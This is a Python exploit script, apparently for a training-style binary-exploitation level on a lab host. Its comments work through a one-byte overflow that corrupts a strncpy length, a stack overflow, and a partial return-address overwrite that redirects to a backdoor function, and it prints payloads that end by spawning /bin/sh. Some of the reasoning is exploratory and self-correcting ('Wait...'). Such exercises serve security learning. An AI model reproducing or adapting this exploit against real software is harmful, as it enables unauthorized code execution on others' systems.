import socket
import struct
import time

# Level 09 Exploit
# Vulnerability:
# 1. set_username() allows writing 41 bytes to a buffer at offset 140.
#    The buffer in handle_msg is 140 bytes (v1).
#    So we can overwrite the byte at v1[140].
#    This byte corresponds to v7 in handle_msg (rbp-0xC), which is the length passed to strncpy in set_msg.
# 2. By overwriting this length byte with a large value, set_msg() will overflow the buffer v1.
# 3. We can then overwrite the return address of handle_msg.
# 4. Since PIE is enabled, we only overwrite the last 2 bytes of the return address to redirect execution to secret_backdoor.
#    handle_msg returns to main+something. secret_backdoor is at 0x88c.
#    The return address will be 0x...AA8 (main start) + offset.
#    We want to jump to 0x...88C.

def exploit():
    host = "192.168.44.139"
    port = 4242
    
    # We need to run this ON the machine or pipe it via SSH.
    # Since we are running this script locally to generate payload, we will just print it.
    
    # 1. Username payload
    # We need to fill 40 bytes + 1 byte for the length overwrite.
    # The length is at offset 140.
    # We want to overwrite it with a large value, e.g., 0xD0 (208).
    # 0xD0 is enough to reach the return address.
    username_payload = b"A" * 40
    username_payload += b"\xff" # Overwrite length with 255
    
    # 2. Message payload
    # This will be copied into v1 using the overwritten length.
    # v1 is at rbp-0xC0.
    # Return address is at rbp+0x8.
    # Distance: 0xC0 + 0x8 = 0xC8 = 200 bytes.
    # We need to pad 200 bytes, then write the new return address.
    # Wait, strncpy copies to v1.
    # v1 is at [rbp-0xC0].
    # We want to reach [rbp+0x8].
    # Distance = 0xC8 (200 bytes).
    
    # Address of secret_backdoor: 0x...88c
    # Address of handle_msg return (in main): 0x...ab8 (call handle_msg is at ab8, so return is ab8+5 = abd?)
    # Let's check objdump again.
    # main:
    # ab8: call handle_msg
    # abd: ...
    # So return address ends in 0xabd.
    # We want to jump to 0x88c.
    # The top bytes are the same.
    # We just need to overwrite the last 2 bytes with 0x088c.
    # But we can't write null bytes easily with strncpy? 
    # strncpy stops at null byte.
    # 0x088c contains a null byte if written as little endian: \x8c\x08.
    # \x08 is not null.
    # So we can write \x8c\x08.
    
    msg_payload = b"B" * 200
    msg_payload += b"\x8c\x08\x00\x00\x00\x00\x00\x00" # Overwrite RIP with secret_backdoor offset
    # Note: strncpy might stop at the first null byte, so we might only write \x8c\x08.
    # That's fine, the rest of the address (top bytes) should remain unchanged if we are lucky?
    # No, we are overwriting 8 bytes. If we stop early, the rest of the bytes on stack might be garbage or 0s?
    # Actually, strncpy pads with nulls if src is shorter than n.
    # So if we send "...\x8c\x08", it will write \x8c\x08 and then fill the rest with 0s.
    # This effectively clears the top bytes of the address!
    # That would jump to 0x000000000000088c, which is valid if the base is 0.
    # But PIE is enabled, so base is not 0.
    # This is a problem.
    
    # Wait, secret_backdoor calls system(fgets(stdin)).
    # So we just need to trigger it.
    
    # Let's look at the stack layout again.
    # v1 is at rbp-0xC0.
    # saved rbp at rbp.
    # return addr at rbp+8.
    
    # If we overwrite only the LSBs, we need to be careful.
    # strncpy(dest, src, n).
    # If len(src) < n, it pads with nulls.
    # If we want to preserve the top bytes, we can't use strncpy with a large n if our src is short?
    # But we control n (the length).
    # If we make n exactly 200 + 2 = 202?
    # And our src is 202 bytes long?
    # Then it writes 202 bytes.
    # The last 2 bytes are \x8c\x08.
    # It won't write more nulls if src is long enough.
    # But does strncpy append a null terminator? No, not if len >= n.
    # But here we are using the overwritten length.
    
    # So:
    # 1. Username: 40 * 'A' + '\xff' (255)
    # 2. Message: 200 * 'B' + '\x8c\x08\x00\x00\x00\x00\x00\x00' ...
    # Wait, if we send bytes, fgets reads them.
    # fgets reads until newline.
    # strncpy copies from the buffer read by fgets.
    # If we put null bytes in our input, fgets reads them fine? Yes.
    # But strncpy stops at null byte!
    # So we cannot have null bytes in the payload before the end.
    # 0x088c -> \x8c\x08. \x08 is Backspace, valid.
    # But the address is 64-bit. The top bytes are 0x000055... something.
    # We cannot overwrite the top bytes with 0s.
    # We need to overwrite ONLY the bottom 2 bytes.
    # But strncpy writes exactly n bytes (or pads with 0s).
    # If we set n = 202, and provide 202 bytes.
    # It writes 202 bytes.
    # The byte at 200 is \x8c.
    # The byte at 201 is \x08.
    # It stops there.
    # It does NOT touch bytes 202+.
    # So the top bytes of the return address (at 202+) remain unchanged!
    # This is perfect.
    
    # So payload:
    # Username: 40 * 'A' + '\xca' (202)
    # Message: 200 * 'B' + '\x8c\x08' + '\n'
    # Then we need to send the command for system() to execute.
    # "/bin/sh"
    
    print("A" * 40 + "\xca") # 202
    print("B" * 200 + "\x8c\x08") # 0x88c (little endian)
    print("/bin/sh")

if __name__ == "__main__":
    exploit()
